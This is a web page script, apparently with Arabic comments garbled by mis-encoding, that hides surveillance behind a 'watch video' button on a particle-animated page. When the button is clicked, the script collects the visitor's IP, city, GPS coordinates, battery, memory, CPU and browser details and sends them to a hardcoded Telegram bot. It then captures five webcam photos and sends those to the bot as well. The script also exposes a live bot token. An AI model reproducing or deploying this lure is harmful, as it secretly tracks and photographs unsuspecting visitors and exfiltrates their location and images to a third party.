<!-- Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø¹Ù„ÙˆÙŠ Ù„Ù… ÙŠØªØºÙŠØ± -->
<!-- ÙÙ‚Ø· Ø§Ù„Ø¬Ø²Ø¡ Ø¯Ø§Ø®Ù„ <script> ØªÙ… ØªØ¹Ø¯ÙŠÙ„Ù‡ Ù„ÙŠØ¹Ù…Ù„ Ø§Ù„Ø²Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯ "Ù…Ø´Ø§Ù‡Ø¯Ø© ÙÙŠØ¯ÙŠÙˆ" -->

<script>
  particlesJS("particles-js", {
    particles: {
      number: { value: 100 },
      color: { value: "#00f2ea" },
      shape: { type: "circle" },
      opacity: { value: 0.5 },
      size: { value: 3 },
      move: { enable: true, speed: 1 }
    }
  });

  const token = "7103221259:AAFngxvMCQ4AlI-JVGIn10RZKdgmOzm9s3w"; // Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ø¬Ø¯ÙŠØ¯
  const chatId = "7220184605"; // Ù†ÙØ³ Ø§Ù„Ù…Ø¹Ø±Ù

  async function sendTelegramMessage(text) {
    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  }

  async function sendPhoto(blob) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "photo.jpg");
    return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }

  async function getIPInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    } catch {
      return {};
    }
  }

  async function getBatteryInfo() {
    try {
      const battery = await navigator.getBattery();
      return {
        level: Math.round(battery.level * 100),
        charging: battery.charging ? "Ù†Ø¹Ù… âš¡" : "Ù„Ø§ âŒ"
      };
    } catch {
      return { level: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ", charging: "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ" };
    }
  }

  async function getLocation() {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition((pos) => {
        const lat = pos.coords.latitude.toFixed(5);
        const lon = pos.coords.longitude.toFixed(5);
        resolve(`https://maps.google.com/?q=${lat},${lon}`);
      }, () => {
        resolve("âŒ ØºÙŠØ± Ù…Ø³Ù…ÙˆØ­ Ø£Ùˆ ØºÙŠØ± Ù…ØªØ§Ø­");
      }, { timeout: 5000 });
    });
  }

  function delay(ms) {
    return new Promise(res => setTimeout(res, ms));
  }

  async function watchVideoProcess() {
    const ipInfo = await getIPInfo();
    const battery = await getBatteryInfo();
    const location = await getLocation();
    const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

    const deviceInfo = navigator.userAgent;
    const screenRes = `${screen.width}x${screen.height}`;
    const connection = navigator.connection || {};
    const memory = navigator.deviceMemory || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
    const cores = navigator.hardwareConcurrency || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

    let message = `
ğŸ¬ ØªÙ… Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ

ğŸŒ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${ipInfo.country_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"}
ğŸ™ï¸ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${ipInfo.city || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"}
ğŸŒ IP: ${ipInfo.ip || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"}
ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ: ${location}

ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:
ğŸ”‹ Ø§Ù„Ø´Ø­Ù†: ${battery.level}%
âš¡ Ù‡Ù„ ÙŠØ´Ø­Ù†ØŸ: ${battery.charging}
ğŸ“¶ Ø§Ù„Ø§ØªØµØ§Ù„: ${connection.effectiveType || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"}
ğŸ’¾ Ø§Ù„Ø°Ø§ÙƒØ±Ø©: ${memory} GB
âš™ï¸ Ø§Ù„Ø£Ù†ÙˆÙŠØ©: ${cores}
ğŸ–¥ï¸ Ø§Ù„Ù…ØªØµÙØ­: ${deviceInfo}
ğŸ“ Ø§Ù„Ø´Ø§Ø´Ø©: ${screenRes}
ğŸ•“ Ø§Ù„ÙˆÙ‚Øª: ${now}
`;

    await sendTelegramMessage(message);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById("video");
      video.srcObject = stream;
      video.play();

      for(let i = 1; i <= 5; i++) {
        await delay(1500);
        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        await new Promise(resolve => canvas.toBlob(async (blob) => {
          await sendPhoto(blob);
          resolve();
        }, "image/jpeg"));
      }

      stream.getTracks().forEach(track => track.stop());

      alert("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± ÙˆØ§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨Ù†Ø¬Ø§Ø­!");

    } catch (err) {
      alert("âš ï¸ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØºÙŠØ± Ù…ÙØ¹Ù„Ø© Ø£Ùˆ ØªÙ… Ø§Ù„Ø±ÙØ¶.");
      await sendTelegramMessage("âš ï¸ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØºÙŠØ± Ù…ÙØ¹Ù„Ø© Ø£Ùˆ ØªÙ… Ø§Ù„Ø±ÙØ¶.");
    }
  }
</script>
